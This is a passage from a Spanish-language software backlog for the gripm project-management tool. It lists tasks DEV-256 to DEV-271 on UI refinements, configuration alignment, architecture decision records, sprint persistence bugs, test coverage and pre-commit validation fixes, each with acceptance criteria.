- [x] #4 Incluye acciones para cambiar vistas, alternar tema, crear tarea, cambiar proyecto y sincronizar documentación
- [x] #5 Accesibilidad completa con role combobox/listbox, useFocusTrap y compatibilidad responsive

---

#### [DEV-256] Renombrar la columna de épica a Parent en SprintView (contenedor: épica o iniciativa)
- **Prioridad**: `medium` | **Tipo**: `feature`

La columna opcional de SprintView que muestra la relación jerárquica de un ítem se rotula "Épica" / "Epic", pero el dato que renderiza no es exclusivamente una épica: la relación `parentId` acepta cualquier ítem contenedor y en la práctica incluye también iniciativas (y features contenedores, según `candidateParents` en `ItemModal.tsx`). El rótulo miente sobre el dato que muestra.

Además el identificador interno de la columna es `'epic'`, lo que arrastra el mismo sesgo semántico al código y complica futuras columnas jerárquicas.

Este trabajo cierra el ítem que quedó pendiente en la sesión Antigravity `a9edf155-8a09-4a3b-b32c-0969c36ba467` (step 160), donde elmodelo ya mapeó `ALL_OPTIONAL_COLS`, `visibleCols.has('epic')` y `sprint.colEpic`, pero la sesión se cortó antes de aplicar el cambio.

Alcance:
1. Clave de traducción `sprint.colEpic` → `sprint.colParent` con valores "Padre" (es) y "Parent" (en), eliminando la clave obsoleta.
2. Identificador de columna `'epic'` → `'parent'` en `ALL_OPTIONAL_COLS`, con **migración defensiva** del estado persistido en `BACKLOG_VISIBLE_COLS`: un usuario que tenga `'epic'` guardado debe conservar la columna visible, no perderla silenciosamente. El catálogo, los aliases legacy y la normalización se extraen a `src/utils/sprintVisibleCols.ts` para ser verificables de forma headless.
3. Encabezado `<th>`, ítem del popover de columnas y celda de datos alineados al nuevo identificador y etiqueta.
4. El texto de la celda ya no puede afirmar "Épica": se apoya en `cleanParentTitle()` (DEV-253), que strippea prefijos tipo `Épica:` / `Iniciativa:` del título del padre.

Fuera de alcance (se mantienen sin cambio): el agrupamiento `GroupBy = 'epic'` / `sprint.groupByEpic` y el string hardcodeado `'Sin Épica'`, que pertenecen al agrupamiento por jerarquía y no a la columna.

**Criterios de Aceptación:**
- [x] #1 `src/locales/es.json` y `src/locales/en.json` exponen `sprint.colParent` con valores "Padre" y "Parent"; la clave `sprint.colEpic` deja de existir en ambos catálogos
- [x] #2 `ALL_OPTIONAL_COLS` en `src/utils/sprintVisibleCols.ts` declara `'parent'` en lugar de `'epic'` y no queda ninguna referencia al identificador `'epic'` en las columnas opcionales de `SprintView.tsx`
- [x] #3 El estado persistido `BACKLOG_VISIBLE_COLS` que contenga `'epic'` se migra a `'parent'` vía `normalizeVisibleCols()`, conservando la visibilidad de la columna en usuarios existentes y reinyectando las columnas núcleo (migración defensiva al estilo DEV-085)
- [x] #4 El encabezado `<th>`, la entrada del popover de columnas y la celda de datos usan `visibleCols.has('parent')` y `t('sprint.colParent')`
- [x] #5 El texto renderizado en la celda no afirma "Épica": se deriva de `cleanParentTitle()` sobre el título del padre resuelto
- [x] #6 `npx tsc --noEmit` reporta 0 errores
- [x] #7 Pirámide de verificación en verde: `npm test` (16 pasos, código 0), `npm run backlog:sync` && `npm run backlog:check`, `npm run publish:check`, `npm run build` y `node scripts/verify-changes.js --all` (411 archivos)

---

#### [DEV-257] Pie de marca y enlaces de valor real en el modal de atajos de teclado (0 px de costo en el tablero)
- **Prioridad**: `low` | **Tipo**: `feature`

El proyecto **no** lleva footer en el lienzo de trabajo: el tablero Kanban necesita el 100 % del alto disponible, la barra inferior móvil ya ocupa la zona táctil crítica y un footer tradicional es un anti-patrón de UX en un cockpit local. Pero la marca (versión) y los enlaces de soporte (repositorio, documentación, reporte de bug) siguen sin ningún lugar natural donde vivir.

Decisión de diseño (sesión Antigravity `4252e537-78f4-4e59-bf91-6290a45fec59`, "Opción 1"): alojar el pie en el diálogo de ayuda de atajos (`KeyboardShortcutsModal`, tecla `?`), que es un modal de **0 % de recurrencia** - abrirlo ya implica que el usuario busca información - y por lo tanto no compite jamás con el flujo de trabajo.

Alcance:
1. Línea de pie hiper discreta dentro de `KeyboardShortcutsModal`: `gripm v<versión>` + enlaces `GitHub`, `Documentación` y `Reportar bug`, en micro-tipografía `text-[11px]`, con separación por `gap` (sin caracteres separadores que se rompan al envolver) y sin iconografía que añada ruido.
2. La versión se toma de `updateAvailable.currentVersion` ya disponible en `boardData`; si el backend no la reporta, el modal degrada a la marca simple `gripm` sin romperse.
3. El grupo de enlaces es un `<nav>` etiquetado por `aria-label`, abre en pestaña nueva con `rel="noreferrer noopener"` y anuncia `(se abre en una pestaña nueva)` en `sr-only`.
4. Área táctil mínima de 44 px por enlace (`min-h-[44px]`) y `flex-wrap` para que en móvil la fila envuelva sin desbordar.
5. Sin costo visual en el tablero: el footer vive únicamente dentro del modal.

Fuera de alcance: bloque "Acerca de" en `SettingsView` (Opción 2, descartada por ahora) y cualquier footer en la aplicación principal.

**Criterios de Aceptación:**
- [x] #1 `KeyboardShortcutsModal` renderiza en su pie un `<nav aria-label>` con la marca `gripm` y, si existe, el sufijo `v<currentVersion>`
- [x] #2 Los tres enlaces (repositorio, documentación y reporte de bug) abren en pestaña nueva con `rel="noreferrer noopener"` y texto visible traducible
- [x] #3 Cada enlace tiene área táctil de al menos 44 px de alto y el contenedor usa `flex-wrap` sin desbordamiento en anchos móviles
- [x] #4 Cada enlace incluye un `sr-only` que anuncia `(se abre en una pestaña nueva)` en español e inglés
- [x] #5 `src/locales/es.json` y `src/locales/en.json` exponen todas las claves nuevas del pie y `KeyboardShortcutsModal` compila sin claves faltantes
- [x] #6 `npx tsc --noEmit` reporta 0 errores
- [x] #7 Pirámide de verificación en verde: `npm test` (16 pasos, 20.2s), `npm run audit:ux` (0 findings nuevos en UX-011), `npm run backlog:sync` && `npm run backlog:check`, `npm run publish:check`, `npm run test:ui`, `npm run build` y `node scripts/verify-changes.js --all` (413 archivos)

---

#### [DEV-258] Refinamiento del pie del cheatsheet: retirar el botón de cierre redundante y alinear el hint de reapertura
- **Prioridad**: `low` | **Tipo**: `chore`

Refinamiento post-release del pie introducido por DEV-257 (que ya se selló y publicó en `v1.3.0`, por lo que esta iteración se registra como ítem nuevo y no como edición de un ítem en `done`).

El pie de `KeyboardShortcutsModal` quedó con un botón "Cerrar" que es una cuarta vía de descarte redundante: el primitivo `Modal` ya ofrece tres, a saber la X del header, la trampa de foco con `Esc` (`useFocusTrap`) y el click en el backdrop. El botón competía por atención con los enlaces de valor real y era el elemento de mayor peso del pie. 

Problemas concretos que corrige:
1. **Redundancia de descarte.** Cuatro elementos cierran el mismo diálogo. Tres son suficientes y las tres restantes son las convencionales (X de header, `Esc`, backdrop). Un cuarto disparador crea ambigüedad sobre cuál es el canónico.
2. **Peso visual y jerarquía.** El botón era el elemento de mayor peso tipográfico del pie (`font-semibold` sobre `bg-slate-200`), es decir, el pie destacaba la acción de salir por encima de la información. Justo lo contrario de un pie informativo.
3. **Ocupación vertical.** El `min-h-[44px]` del botón forzaba `py-3` (68 px de alto). Sin él, el alto lo fija el `min-h-[44px]` de los enlaces y el pie baja a `py-2` (60 px), liberando espacio para el cuerpo del modal en pantallas bajas.
4. **Hint de reapertura inline.** El texto "Presiona ? en cualquier momento para abrir esta guía" pasa a compartir la fila con la marca y los enlaces, en el extremo opuesto (`justify-between`), en lugar de ocupar un bloque propio. Por debajo de `sm` se oculta, de modo que en móvil la fila queda en una sola línea con `marca + enlaces`.
5. **Corte duro de scroll (hallazgo de verificación visual).** Al retirar el botón y bajar el pie, el borde inferior del cuerpo scrolleable quedó pegado a la línea del pie. Cuando un header de sección caía justo sobre ese borde se leía como texto pisado o partido. No era solapamiento real - el pie nunca puede superponerse porque el cuerpo scrollea - , sino un corte abrupto que se resuelve con un `mask-image` degradado en los últimos 28 px más `pb-7` de aire.

Fuera de alcance: cualquier cambio en la X del header, en el primitivo `Modal` o en la semántica de la trampa de foco.

**Criterios de Aceptación:**
- [x] #1 El pie de `KeyboardShortcutsModal` no renderiza ningún botón de cierre
- [x] #2 El diálogo sigue siendo descartable por la X del header, por `Esc` y por click en el backdrop, verificado sobre el primitivo `Modal` (`onClick={onClose}` en el backdrop) y `useFocusTrap` (`event.key === 'Escape'`), con el paso `focus-trap` de la suite en verde
- [x] #3 El hint de reapertura se renderiza en la misma fila que la marca y los enlaces, alineado al extremo derecho por `justify-between`, y permanece oculto por debajo de `sm` (UX-002: el `<kbd>` conserva `hidden sm:inline-flex` en su propia línea porque el auditor es de matching por línea)
- [x] #4 El pie pasa de `py-3` a `py-2` y el alto resultante queda determinado por el `min-h-[44px]` de los enlaces; `npm run audit:ux --rule UX-009` reporta 0 findings
- [x] #5 `npx tsc --noEmit` reporta 0 errores
- [x] #6 Pirámide de verificación en verde: `npm test` (16/16 pasos), `npm run audit:ux` (0 errores, 0 sugerencias; las 12 advertencias son los falsos positivos documentados de UX-010), `npm run backlog:sync` && `npm run backlog:check`, `npm run publish:check`, `npm run build` y `node scripts/verify-changes.js --all` (414 archivos)
- [x] #7 El cuerpo scrolleable no corta contenido en seco contra la línea del pie: aplica `mask-image` con degradado en los últimos 28 px más `pb-7` de aire, de modo que un header de sección que caiga sobre el borde de scroll se disuelva en el pie y se lea como "hay más abajo" en lugar de texto pisado

---

#### [DEV-259] Alinear .gripm/config.json del repo con la configuración OSS canónica documentada en AGENTS.md
- **Prioridad**: `low` | **Tipo**: `chore`

El gotcha 17 de `AGENTS.md` declara que `.gripm/config.json` define la configuración OSS canónica del repositorio, y la describe con `"methodology": "kanban"` y `"enabledTabs": { "kanban": true, "sprint": false, "release": true }`. El archivo commiteado no coincidía con esa descripción en dos claves, y además arrastraba defaults de esquema que ya no existían en el modelo de configuración vigente.

Divergencias detectadas al contrastar disco contra documentación:

| Clave | En HEAD | Canónico (gotcha 17) | Motivo del cambio |
| :--- | :--- | :--- | :--- |
| `methodology` | `scrum` | `kanban` | El repo opera bajo flujo Kanban continuo (gotcha 16); `scrum` contradecía la propia metodología declarada |
| `mode` | `single` | - | Estado real del entorno de trabajo, sin efecto en la distribución |
| `enabledTabs.sprint` | `true` | `false` | Alineación con el canónico documentado |
| `modules.calendar` | ausente | - | Default de esquema |
| `estimation` | ausente | - | Default de esquema (DEV-137/DEV-139) |
| `visibleCardMetadata` | ausente | - | Default de esquema (8 claves) |

Alcance:
1. `enabledTabs.sprint` pasa a `false` para respetar el canónico documentado.
2. Se conservan los defaults de esquema incorporados (`calendar`, `estimation`, `visibleCardMetadata`), que son la forma normalizada que el modelo vigente espera y no constituyen preferencias personales.
3. Verificar que el tab de Sprints deshabilitado no deja la app en un estado inconsistente: `App.tsx` ya resuelve el caso con la auto-redirección `sprint → kanban`, de modo que `defaultView: "sprint"` degrada sin intervención.

Fuera de alcance: modificar `AGENTS.md` (el canónico documentado es la referencia a la que se alinea la config), `defaultView`, y cualquier clave de `theme`, `density` o `language`, que ya coinciden con el canónico.

**Criterios de Aceptación:**
- [x] #1 `.gripm/config.json` declara `methodology: "kanban"` y `enabledTabs: { "kanban": true, "sprint": false, "release": true }`, coincidindo con el canónico del gotcha 17 de `AGENTS.md`
- [x] #2 El JSON sigue siendo válido (parseado con `ConvertFrom-Json`) y conserva la ausencia de newline terminal que tenía en HEAD (último byte `125` = `}`)
- [x] #3 Con `enabledTabs.sprint: false` la app no queda en un tab huérfano: `activeTab` se inicializa desde `localStorage` o `kanban` y **no** desde `config.defaultView`, y un `activeTab: 'sprint'` persistido degrada por la auto-redirección de `App.tsx` hacia `kanban`. Verificado en runtime con `npm run test:ui` (Playwright) en verde
- [x] #4 `npm run backlog:sync` y `npm run backlog:check` reportan coherencia con `BACKLOG.md`
- [x] #5 `npm test` sigue en verde (16/16 pasos) y `node scripts/verify-changes.js --all` valida el árbol (415 archivos)

---

#### [DEV-260] Sistema de ADR (Architecture Decision Records) en docs/adr y registro de las decisiones fundacionales de gripm
- **Prioridad**: `medium` | **Tipo**: `chore`

El Protocolo de Aprendizaje Continuo del playbook (`.agents/TEAM_PLAYBOOK.md`, sección "Continuous Learning Protocol") exige que todo patrón arquitectónico superior quede registrado como *Architectural Decision Record*, y la plantilla de sprint (`docs/sprints/SPRINT_SPEC_TEMPLATE.md`, sección "KNOWLEDGE FEED") reserva un campo `ADR Recorded: [path]` que hoy no tiene destino canónico. En el repositorio no existía ninguna carpeta `docs/adr/`, de modo que el protocolo era inaplicable y las decisiones arquitectónicas más load-bearing de gripm vivían únicamente dispersas en prosa de `AGENTS.md`, `README.md` y `docs/ARCHITECTURE.md`.

Decisiones ya tomadas y consolidadas en el código, hoy sin registro formal:

1. **Markdown como fuente de verdad** (`backlog-md`), con `BACKLOG.md` como consolidado generado y Git como control de versiones.
2. **Backend embebido como plugin de middleware de Vite** (`server/` + `vite.config.ts`), sin servidor de aplicación propio ni proceso adicional.
3. **Servidor MCP por stdio** (`scripts/mcp-server.ts` + `bin/gripm-mcp.js`), 12 herramientas JSON-RPC 2.0 sobre el mismo núcleo de persistencia que la UI.
4. **Daemon local monousuario sin autenticación HTTP** (SEC-10), mitigado con validación de `Host`/`Origin` y cabeceras de seguridad (SEC-01, DEV-243).
5. **Overlays montados con `createPortal` y layout raíz estable** (Zero-CLS), DEV-129, DEV-130 y gotcha 10 de `AGENTS.md`.

Alcance de esta tarea:
1. Crear `docs/adr/` con convención de nombres MADR (`NNNN-slug.md`, numeración secuencial e inmutable), estados canónicos y plantilla `0000-plantilla.md`.
2. Sembrar los 5 ADR fundacionales como registros de decisión **ya aceptados** (documentan el estado del arte, no abren debate).
3. Enlazar el registro desde `docs/ARCHITECTURE.md` y desde `AGENTS.md` (gotcha de trazabilidad arquitectónica).

Fuera de alcance: validación mecánica de la convención en `scripts/verify-changes.js` (decidido explícitamente con el PO: la convención queda documentada, sin fricción nueva en el gate), y renumerar o reescribir decisiones preexistentes en documentos actuales.

**Criterios de Aceptación:**
- [x] #1 Existe `docs/adr/README.md` con: propósito del registro, criterio de "esto merece un ADR", anatomía del documento, estados canónicos (`Propuesta`, `Aceptado`, `Reemplazado`, `Obsoleto`), reglas de inmutabilidad y el índice completo de registros
- [x] #2 Existe `docs/adr/0000-plantilla.md` como plantilla reutilizable con las secciones del formato MADR (Contexto, Decision Drivers, Opciones consideradas, Decisión, Consecuencias, Referencias) y frontmatter de estado y fecha
- [x] #3 Los 5 ADR semilla existen con numeración `0001`-`0005` y slug kebab-case en español: `0001-markdown-como-fuente-de-verdad.md`, `0002-backend-embebido-como-plugin-de-vite.md`, `0003-servidor-mcp-por-stdio.md`, `0004-daemon-local-sin-autenticacion-http.md`, `0005-overlays-via-portales-y-layout-estable.md`
- [x] #4 Cada ADR semilla documenta contexto, opciones descartadas **con motivo**, decisión, consecuencias (positivas y negativas) y referencias a tareas del backlog que lo originaron
- [x] #5 `docs/ARCHITECTURE.md` incluye una sección que enlaza el registro de ADR y aclara que ARCHITECTURE.md describe el estado actual mientras que el ADR registra el porqué de las decisiones
- [x] #6 `AGENTS.md` incorpora un gotcha de trazabilidad arquitectónica que obliga a registrar en `docs/adr/` toda decisión con trade-offs reales, y remite al campo `ADR Recorded` de la plantilla de sprint
- [x] #7 `npm run backlog:sync` y `npm run backlog:check` reportan coherencia con `BACKLOG.md` (código 0)
- [x] #8 `node scripts/verify-changes.js --all` valida el árbol completo sin defectos estructurales ni de codificación

---

#### [DEV-261] Sprints se escriben pero se descartan al leer en proyectos en modo JSON
- **Prioridad**: `high` | **Tipo**: `bug`

Encontrado al ejecutar DEV-222 (dataset de la sandbox), al verificar dónde Persisten
los sprints de un proyecto en modo JSON.

**La rama JSON de `readProjectBacklog()` omite el campo `sprints` en el objeto que
devuelve, pero `writeProjectBacklog()` sí lo escribe completo.** La escritura y la
lectura no están en simetría: lo que se persiste nunca vuelve a leerse.

### Los dos lados, medidos

`server/services/storage.ts:384-389`, rama JSON del read:

```ts
return {
  project: { ...project, storageType: 'json' },
  items,
  releases: Array.isArray(parsed.releases) ? parsed.releases : [],
  lastUpdated: parsed.lastUpdated || new Date().toISOString()
};
```

`server/services/storage.ts:799`, `writeProjectBacklog` modo JSON:

```ts
fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
```

`data` se escribe entero, `sprints` incluido. La interfaz `ProjectBacklog`
(`server/types.ts:16-22`) declara `sprints?: any[]`, así que el tipo dice que el campo
existe: **el contrato promete un campo que el read nunca devuelve.**

La rama markdown no tiene el problema: lee y devuelve `sprints` desde
`backlog/sprints.json` (`storage.ts:262-267` y `:336`).

### Consecuencias observables

1. **`GET /api/sprints` responde `[]` siempre en un proyecto JSON.** La ruta
   (`server/routes/api.ts:1005`) hace `backlog.sprints || []`, y `backlog` viene del
   read que ya lo descartó.
2. **Un sprint creado desde la UI se persiste y después desaparece.** `POST /api/sprints`
   (`api.ts:1018`) hace `backlog.sprints = backlog.sprints || []`, escribe, y en el
   siguiente `GET` la lista vuelve a estar vacía.
3. **Colisión de IDs al crear dos sprints seguidos.** El cálculo de `maxNum`
   (`api.ts:1038-1045`) parte siempre de un array vacío, así que genera
   `sprint-${length}` con el mismo valor las dos veces.
4. **Afecta al proyecto demo.** `isBacklogMdProject()` devuelve `false` para `isDemo`
   (`registry.ts:34`), así que el demo vive en modo JSON y es uno de los casos rotos.

### Por qué no se notó antes

El modo markdown es el camino feliz y cubre el uso local principal. El modo JSON es
además el de los proyectos sin `backlog.md`, y ahí no hay ningún test que lea de vuelta
lo que se escribió. Ninguna suite ejercita hoy el ciclo completo de escritura y relectura
en modo JSON.

**Criterios de Aceptación:**
- [x] #1 La rama JSON de `readProjectBacklog()` devuelve `sprints` con guard `Array.isArray`, en los tres puntos de retorno de esa rama (normal, inicial y error)
- [x] #2 `GET /api/sprints` devuelve los sprints de un proyecto JSON tras un ciclo de escritura completo, y sobrevive a un reinicio del daemon
- [x] #3 Crear dos sprints consecutivos en modo JSON produce IDs distintos: el cálculo de `maxNum` de `api.ts:1038` parte de la lista leída, no de una lista siempre vacía
- [x] #4 El proyecto demo (`isDemo: true`, modo JSON) expone sus sprints en la vista Sprint
- [x] #5 Test de regresión que cubra el ciclo **escribir y volver a leer** en modo JSON, que es el que faltaba y por eso el defecto no fue detectado
- [x] #6 `npx tsc --noEmit` con 0 errores, `npm test` y `npm run backlog:check` con código 0

---

#### [DEV-262] Cobertura de tests para el adaptador sandbox y el detector de entorno
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

La sandbox web de DEV-222 se publicó y está en producción, pero su lógica **no tiene una
sola aserción**. Son ~480 líneas de `src/data/sandbox.ts` más el detector de
`src/data/detect.ts`, y la suite de 17 pasos no las toca.

El contraste es lo que hace el hueco visible: el equivalente del lado daemon tiene tests
propios para cada almacenamiento (optimistic-locking, legacy-import, json-sprint,
resilience), mientras que el camino que ahora atiende a cualquier visitante de la demo
pública no tiene ninguno.

Lo verificado en runtime fue de extremo a extremo en un navegador real, lo cual **no es
lo mismo**: una prueba manual sobre un recorrido feliz no encuentra la colisión de un
correlativo ni el sprint que queda activo sin querer. Un bug acá no filtra datos ni rompe
instalaciones - se manifiesta como una demo visiblemente rota - pero es producto público.

**Criterios de Aceptación:**
- [x] #1 Caso de regresión que falle si `nextCode()` no genera el correlativo esperado al crear ítems sobre el seed real
- [x] #2 Ciclo borrado lógico → restaurar → purgar verificado campo por campo, incluyendo `previousStatus` y que `purgeItem()` sea el único que saca el ítem del array
- [x] #3 Invariante de un solo sprint `active` verificado tanto al crear como al actualizar, incluido el demotaje de los preexistentes
- [x] #4 `deleteSprint()` deja los ítems desasociados (`sprint`, `targetSprint` y `sprints` vacíos), no apuntando a un nombre inexistente
- [x] #5 `bulkUpdateItems()` devuelve el conteo correcto y no permite sobrescribir `id` ni `code`
- [x] #6 `deleteProject()` en cascada no deja ítems, releases ni sprints huérfanos
- [x] #7 `resetSandbox()` borra `gripm_sandbox_board` y `gripm_sandbox_config` y vuelve al seed
- [x] #8 `fetchBoardData()` devuelve un clon: mutar el resultado no altera el estado interno del adaptador
- [x] #9 `detect.ts`: probe que responde JSON → `httpAdapter`; que falla o agota el timeout → `sandboxAdapter`; y **una sola** invocación de `fetch` aunque haya llamadas concurrentes
- [x] #10 `detect.ts` rechaza una respuesta 200 con `content-type` no JSON, que es el caso de un SPA servida en `/api/data`
- [x] #11 Test de paridad del contrato que falle al agregar un método a `GripmApi` sin implementarlo en ambos adaptadores
- [x] #12 Test que valida `data/demo-backlog.json` contra los tipos del cliente y del server, cubriendo las 5 columnas, sprints y ACs
- [x] #13 `npm run audit:ux` en verde **sin regenerar el baseline**, `npx tsc --noEmit` con 0 errores y `npm test` y `npm run backlog:check` con código 0

---

#### [DEV-266] Separar el requisito de runtime del consumidor del requisito de desarrollo
- **Prioridad**: `high` | **Tipo**: `bug`

`engines.node` declaraba `>=22.6.0`, pero ese requisito **no le corresponde al consumidor**:
es el requisito de **desarrollar** el repo, no el de **usar** el paquete.

**Criterios de Aceptación:**
- [x] #1 `engines.node` declara el requisito del **consumidor**, alineado con el badge del README
- [x] #2 `devEngines.runtime` declara el requisito de **desarrollo** con `onFail: "error"`, para que un colaborador en un runtime incompatible reciba un error explícito y no un fallo raro más tarde
- [x] #3 `npm install` sigue funcionando sin error en el runtime de desarrollo y en el de CI
- [x] #4 El badge de Node del README y `engines.node` dicen lo mismo, verificado por comparación de strings
- [x] #5 Documentado en `CONTRIBUTING.md` por qué hay dos requisitos distintos y cuál aplica a quién
- [x] #6 Medido qué runtime mínimo soporta realmente `bin/gripm.js`, ejecutándolo y no deduciendo del `target` de esbuild, para decidir si `>=20.0.0` se puede bajar o hay que subirlo
- [x] #7 Revisado DEV-223, que quedó en `done` con ACs que nunca se verificaron y con una premisa que expiró, para que no siga afirmando una garantía que no existe
- [x] #8 `npx tsc --noEmit` con 0 errores, `npm test` con 17/17 y `npm run backlog:check` con código 0

---

#### [DEV-267] El guard de ACs no detectaba marcadores malformados y daba verde sobre datos descartados
- **Prioridad**: `high` | **Tipo**: `bug`

`scripts/verify-backlog-sync.js` parsea el bloque de Acceptance Criteria con
`/<!-\- AC:BEGIN ->([\s\S]*?)<!-\- AC:END ->/` y, si no matchea, hace **`continue`**: pasa a la
siguiente tarea sin verificar nada y sin decir nada.

La consecuencia es que **un marcador malformado era indistinguible de una tarea sin ACs**. Un
archivo que abre `<!-\- AC:BEGIN ->` y no lo cierra:

- se saltaba **todas** las invariantes de ACs (conteo, ids, checks cruzados contra el código),
- sus ACs **no llegaban a `BACKLOG.md`**,
- y `npm run backlog:check` informaba **`✅ Backlog 100% sincronizado y coherente con el
  código`**.

**Verde sobre datos que nunca leyó.** Siete archivos estaban en ese estado, arrastrando el
defecto desde v1.3.0: todos cerraban su bloque de ACs con `<!-\- SECTION:DESCRIPTION:END ->`
 - un marcador duplicado del que ya usan correctamente más arriba - en vez del de cierre de ACs.
Dos de los siete son de la sesión del 2026-10-14 (DEV-258 y DEV-259, ambos en `ready`).

Esto es peor que un falso positivo: un falso positivo detiene el flujo con un diagnóstico
equivocido. Esto **dejaba pasar** el flujo con un diagnóstico correcto sobre un conjunto de
datos incompleto.

**Criterios de Aceptación:**
- [x] #1 `verify-backlog-sync.js` trata un `AC:BEGIN` sin `AC:END` como **error**, no como ausencia de ACs: mensaje explícito que nombre el archivo, `errorsFound++` y exit 1
- [x] #2 Los siete archivos malformados (DEV-253 a DEV-259) quedan reparados con el marcador correcto
- [x] #3 Los ACs de DEV-253 a DEV-259 aparecen en `BACKLOG.md`, verificado por grep sobre el consolidado
- [x] #4 El guard **demuestra** que dispara: roto un marcador a propósito, `verify-backlog-sync.js` devuelve exit 1 con el mensaje; restaurado, vuelve a 0
- [x] #5 `npm run backlog:sync`, `npm run backlog:check` y `npm test` en verde tras la reparación
- [x] #6 `npx tsc --noEmit` y `node scripts/verify-changes.js --all` con código 0

---

#### [DEV-268] El hook de pre-commit valida que BACKLOG.md esté presente, no que corresponda al commit
- **Prioridad**: `high` | **Tipo**: `bug`

El hook `.githooks/pre-commit` rechaza el commit cuando se modifican tareas y `BACKLOG.md`
**no está en el índice**. No verifica que el `BACKLOG.md` que se está por commitear
**corresponda a las tareas que se están por commitear**.

Esa diferencia es la que rompió CI el 2026-10-14 en `7d50af0`:

1. El working tree tenía un cambio **sin commitear** en DEV-264.
2. `npm run backlog:sync` regeneró `BACKLOG.md` **leyendo el working tree**, así que el
   consolidado describía la versión nueva de DEV-264.
3. `git add BACKLOG.md` lo subió al índice. El commit `a070a5e` quedó con un consolidado
   que describía un archivo que ese commit no contenía.
4. El hook pasó: `BACKLOG.md` estaba en el índice, que es exactamente lo que exige.
5. En CI el checkout trae DEV-264 en su versión de HEAD, el consolidado no coincide, y
   `npm run backlog:check` falla con exit 1.

**El hook y CI miden cosas distintas.** El hook mide presencia; CI mide correspondencia.
El hook es la única barrera entre el error y el push, y es la que no lo detecta.

El defecto es de clase: cualquier tarea sin commitear en el working tree durante un
`backlog:sync` reproduce el fallo, y el síntoma aparece **un commit después, en otra
máquina**, sin forma local de reproducirlo salvo que se haga stash primero.

**Criterios de Aceptación:**
- [x] #1 El hook (o `verify-backlog-sync.js` en un modo nuevo) regenera el consolidado **leyendo el índice de git**, no el working tree, y compara contra el `BACKLOG.md` staged
- [x] #2 Con una tarea modificada en el working tree y **sin** stagear, el hook pasa; con esa misma tarea **stageada** y un `BACKLOG.md` stale en el índice, el hook falla con exit 1
- [x] #3 El mensaje de error nombra el archivo `.md` cuya versión no coincide con el consolidado, en vez de un "BACKLOG.md no incluido en el índice" que era cierto pero irrelevante
- [x] #4 Demostrado en ambos sentidos: staging del caso que falla y del caso que pasa, con el comando ejecutado y la salida
- [x] #5 El check local (`npm run backlog:check`) y el de CI pasan con el árbol limpio, sin necesidad de `git stash`
- [x] #6 `npx tsc --noEmit`, `npm test` y `node scripts/verify-changes.js --all` con código 0

---

#### [DEV-270] Armonización y simetría visual en selector de navegación del Header (Tabs)
- **Prioridad**: `high` | **Tipo**: `ux`

En `src/components/Header.tsx`, los botones del segmented control de vistas (`Tablero`, `Sprints`, `Releases`) poseen dimensiones mínimas dispares y hardcodeadas (`min-w-[88px]`, `min-w-[145px]`, `min-w-[98px]`).

Esta disparidad se introdujo originalmente para prevenir saltos de línea ante textos extensos en español, pero provoca que el control segmentado central del encabezado se perciba visualmente asimétrico, irregular y desbalanceado con respecto a los estándares de diseño de componentes de navegación.

Adicionalmente, en resoluciones compactas de escritorio (1024×768 a 1366×768), la distribución `grid grid-cols-[1fr_auto_1fr]` con `justify-self-center` genera una **colisión crítica**: el bloque izquierdo (selector de proyecto + badge Demo + botón `Reset demo` con texto expandido) excede el tercio asignado y desborda físicamente sobre las pestañas centrales, montando el botón `Reset demo` directamente encima de la pestaña `Board` (Tablero).

### Objetivos:
1. Homogeneizar el ancho y espaciado de los botones del selector de vistas para lograr una barra simétrica y balanceada sin anchos artificiales sobredimensionados (`min-w-[145px]`).
2. Blindar el layout del Header mediante límites de ancho y flexbox/grid responsivo para garantizar cero colisión física entre el bloque de proyecto y la barra central de navegación a cualquier resolución (>= 1024px).
3. Optimizar el botón `Reset demo` del Header: colapsar a icono accesible con tooltip en pantallas compactas (< 1280px / `xl`), e incorporar la acción de reinicio en el banner de demo interactivo de `App.tsx` para máxima usabilidad.
4. Asegurar paridad bilingüe (`en` / `es`) y preservar la estabilidad visual Zero-CLS sin oscilaciones al alternar idiomas.

**Criterios de Aceptación:**
- [x] #1 Los botones del segmented control en `Header.tsx` comparten un dimensionamiento armónico y simétrico sin saltos bruscos de ancho entre pestañas (`min-w-[145px]` reemplazado por dimensionamiento equilibrado)
- [x] #2 Las etiquetas visuales en inglés y español no desbordan ni fuerzan anchos desproporcionados
- [x] #3 Se preserva la estabilidad Zero-CLS al alternar entre inglés y español
- [x] #4 Los estados activo, hover y focus ring mantienen coherencia con los tokens de diseño
- [x] #5 Cero solapamiento ni desborde entre la columna izquierda (`singleProject`, `Reset demo`) y las pestañas centrales de navegación en resoluciones de escritorio (1024×768 a 1366×768)
- [x] #6 El botón `Reset demo` en el Header se muestra en modo icon-only con tooltip accesible (`title` y `aria-label`) en resoluciones compactas (< 1280px), expandiendo su texto solo en pantallas amplias (`xl`), y la acción se expone también en el banner de demo de `App.tsx`
- [x] #7 `npm test`, `npm run audit:ux` y `npm run backlog:check` pasan con código 0

---

#### [DEV-271] Zonas de soltado multi-estado ampliadas y apiladas a ancho completo en KanbanBoard
- **Prioridad**: `medium` | **Tipo**: `ux`

En columnas Kanban que agrupan más de un estado (por ejemplo, la columna de trabajo en curso que agrupa `doing`, `review`, `testing_qa`), `KanbanBoard.tsx` renderiza las subzonas de soltado específicas dentro de un `grid grid-cols-2` con cajas pequeñas (`p-2 text-[11px] truncate`).

Al arrastrar una tarjeta, el usuario debe realizar una puntería excesivamente precisa para soltar sobre una de estas mitades estrechas. El texto suele cortarse y el área táctil / de puntero no ofrece la suficiente tolerancia ni claridad de a qué estado exacto se está transicionando la tarea.

### Objetivos:
1. Reemplazar la grilla compacta de dos columnas por una disposición vertical apilada que ocupe **todo el ancho de la columna** (`flex flex-col gap-2 w-full`).
2. Incrementar la altura y el padding de cada slot de soltado (`py-3 px-4`) para transformarlo en un drop-target generoso y ergonómico.
3. Incorporar borde discontinuo visible, dot de color del estado y texto completo sin elipsis (`truncate`) que confirme el destino antes de soltar.
4. Mantener la animación suave de apertura y cierre de zonas durante el arrastre sin generar saltos de scroll.

**Criterios de Aceptación:**
- [x] #1 Al arrastrar una tarjeta sobre una columna con múltiples estados mapeados, las subzonas de soltado se presentan apiladas ocupando todo el ancho de la columna
- [x] #2 Cada subzona dispone de altura y padding ergonómico que facilita el soltado con mouse o touch
- [x] #3 La etiqueta y el indicador de estado se leen de forma completa sin cortes abruptos por elipsis
- [x] #4 El estado de hover / sobre-vuelo resalta intensamente la subzona destino con feedback de color y borde
- [x] #5 Soltar la tarjeta en una subzona asigna el estado exacto correspondiente
